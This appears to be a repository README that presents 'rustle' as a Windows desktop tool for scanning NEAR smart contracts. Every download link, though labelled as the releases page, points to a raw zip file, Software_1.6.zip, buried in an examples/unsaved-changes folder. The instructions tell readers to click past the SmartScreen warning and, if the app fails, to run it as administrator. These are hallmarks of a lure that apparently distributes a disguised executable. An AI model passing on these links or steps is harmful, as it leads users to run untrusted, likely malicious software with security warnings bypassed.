# 🛡️ rustle - Find Smart Contract Risks Fast

[![Download rustle](https://img.shields.io/badge/Download-rustle-4A90E2?style=for-the-badge&logo=github)](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)

## 📥 Download Rustle

Rustle is available from the releases page. Use the link below to visit the page, then download the Windows file that matches your system.

[Visit the Rustle releases page](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)

## 🖥️ What Rustle Does

Rustle is a desktop tool for checking NEAR smart contracts written in Rust. It scans contract code for common security issues and points out places that may need review.

Use Rustle when you want to:
- check a smart contract before release
- review code for common security flaws
- spot risky patterns in Rust contract code
- get a fast local scan on Windows

Rustle is built for people who want a simple way to review contract code without reading through every line by hand.

## ⚙️ Before You Start

Use a Windows PC with:
- Windows 10 or Windows 11
- enough free space for the app and scan files
- permission to run downloaded programs
- an internet connection to open the release page and get the file

For best results, keep the contract files you want to check in a single folder before you start.

## 🚀 Getting Started

Follow these steps to use Rustle on Windows.

1. Open the Rustle releases page:
   [https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)

2. Find the latest release near the top of the page.

3. Under Assets, look for the Windows file. It may end in `.exe`, `.zip`, or another Windows format.

4. Download the file to your computer.

5. If the file is a `.zip`, right-click it and choose Extract All.

6. Open the extracted folder or the downloaded app.

7. If Windows asks for permission to run the file, choose Run.

8. If a SmartScreen message appears, select More info, then Run anyway if you trust the file source.

9. Start Rustle and open the folder that contains your NEAR smart contract code.

10. Run a scan and wait for the results.

## 🔎 How to Use Rustle

Rustle follows a simple flow:

- choose the contract folder
- start the scan
- review the issues it finds
- fix the code if needed
- scan again

The app checks for patterns that may affect contract safety. It can help you catch issues before you deploy.

## 🧭 What to Expect During a Scan

When you scan a contract, Rustle may look for:
- access control issues
- unsafe contract calls
- missing checks on input data
- risky state changes
- logic that may lead to unexpected results
- code paths that deserve closer review

The scan result may show line references and short notes. Use those notes as a guide when you review the code.

## 📂 Typical Windows Setup

If Rustle comes as a zipped file:
1. Download the file from the releases page
2. Right-click the file
3. Select Extract All
4. Open the extracted folder
5. Double-click the Rustle app

If Rustle comes as an `.exe`:
1. Download the file from the releases page
2. Double-click the file
3. Confirm any Windows permission prompt
4. Start the scan from the app window

## 🛠️ Common Use Cases

Rustle fits well when you need to:
- review a contract before a testnet deploy
- check code after a change
- look for mistakes before a security review
- inspect code from another team
- confirm that a fix did not add new risk

## 📋 Supported File Types

Rustle works best with NEAR smart contract projects in Rust. It can review source folders that include:
- `.rs` files
- project folders with contract code
- common Rust workspace layouts
- code used in NEAR DApp contracts

For best results, point Rustle at the main project folder, not a single file inside the project.

## 🔐 Safety Checks You Can Expect

Rustle is focused on contract security. It can help surface:
- missing permission checks
- unsafe handling of user input
- weak boundary checks
- problems in contract logic
- patterns that can lead to security issues

It does not replace a full manual review. Use it as a first pass before deeper inspection.

## 🧰 If the App Does Not Start

If Rustle does not open on Windows, try these steps:
1. Download the file again from the releases page
2. Check that the download completed
3. Extract the zip file again if needed
4. Right-click the file and choose Run as administrator
5. Make sure Windows did not block the file
6. Restart your computer and try again

If the app opens but does not scan your code:
1. Check that you selected the right project folder
2. Confirm the folder contains Rust source files
3. Try a smaller project first
4. Close and open the app again

## 🧪 Tips for Better Results

Use Rustle with a clean project folder. Keep these tips in mind:
- scan one contract at a time
- avoid folders with unrelated files
- keep file names simple
- review the code after each scan
- run Rustle again after fixes

These steps make it easier to read the scan output and track changes.

## 🧑‍💻 For NEAR Contract Review

Rustle is made for NEAR smart contracts written in Rust. It is useful when you work on:
- token contracts
- access-managed contracts
- contract logic with user funds
- programs that store and update state
- DApps that need a quick security check

If your project uses NEAR-specific patterns, Rustle can help you spot areas that need review.

## 📌 Quick Start Checklist

- open the releases page
- download the Windows file
- extract it if needed
- open the app
- select your contract folder
- run the scan
- review the findings
- fix the code
- scan again

## 🗂️ Folder Layout Example

A simple project may look like this:

- my-contract/
  - src/
    - lib.rs
  - Cargo.toml
  - README.md

If your contract uses a layout like this, choose the `my-contract` folder in Rustle.

## ❓ Help With the First Run

If you are using Rustle for the first time:
- start with a small project
- use a folder you know well
- read the scan results one item at a time
- compare the note with the code near that line
- fix one issue before you move to the next

That approach keeps the process simple.

## 📥 Download Again

If you need the file again, use the releases page here:
[https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)

## 📎 Project Focus

Rustle helps with:
- static analysis
- contract review
- Rust-based NEAR code
- security checks
- local Windows use